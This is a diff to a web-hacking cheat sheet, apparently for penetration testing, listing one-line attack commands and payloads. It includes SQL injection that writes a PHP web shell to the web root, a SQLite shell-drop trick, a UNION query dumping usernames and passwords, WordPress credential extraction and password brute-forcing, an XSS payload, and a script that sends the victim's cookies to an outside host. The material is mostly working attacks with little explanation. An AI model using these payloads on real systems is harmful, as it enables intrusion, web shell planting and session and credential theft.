@@ -1,14 +1,15 @@
-Web Hacking----
-Directory Busting----
+####Web Hacking
+
+##Directory Busting
 Gobuster----gobuster -u <ip> -w /usr/share/dirb/wordlists/big.txt
 Dirbuster----dirb http://target/directory/ /usr/share/dirb/wordlists/common.txt
 Find Parameters Wordlists----find . | grep -i param
 Bust Parameter Names----wfuzz --hw 0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://target.com/shell.php?FUZZ=id
 
-Local File Inclusion----
+##Local File Inclusion
 List of Windows Files----<a href="http://pwnwiki.io/?_escaped_fragment_=presence/windows/blind.md#!presence/windows/blind.md">Windows Blind Files</a>
 
-SQL Injection----
+##SQL Injection
 Basic sqlmap----sqlmap -u <target-url>
 sqlmap maximum risk & specify DBMS----sqlmap -u <target-url> --DBMS=MSSQL 
 MySQL (Inject malicious PHP code into file)----SELECT '<?php passthru($_GET[cmd])?>' INTO OUTFILE '/var/www/cmd.php'
@@ -17,12 +18,19 @@ Sqlite (Into Outfile equivalent)----"""ATTACH DATABASE '/home/devnull/public_htm
 	INSERT INTO pwn.shell (code) VALUES ("test");"""
 Multiple Columns in a Single Column----' UNION SELECT username || '~' || password FROM users--
 
-Odds & Ends----
+##Odds & Ends
 FireFox Browse Nonstandard Ports----about:config --> network.security.ports.banned.override (String <port-num>)
 
 Webdav----sudo mount -t davfs http://<target-server>:<port> /mnt/webdav
 
-Wordpress----
+##Wordpress
 Post-Exploitation----Database credentials located in wp-config.php (cat wp-config.php | grep DB_)
 Wordpress Scan----wpscan --url <domain>  -e ap,at,u,cb,dbe --password-attack 
 xmlrpc -P /usr/share/wordlists/fasttrack.txt -o wpscan.txt
+
+##XSS
+SVG - No spaces----<svg/OnLoad="`${prompt``}`">
+Cookie Stealing----<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
+
+##Cloud
+Domain Hijacking----Have 404s pointing to a S3 bucket?  Take over the subdomain!
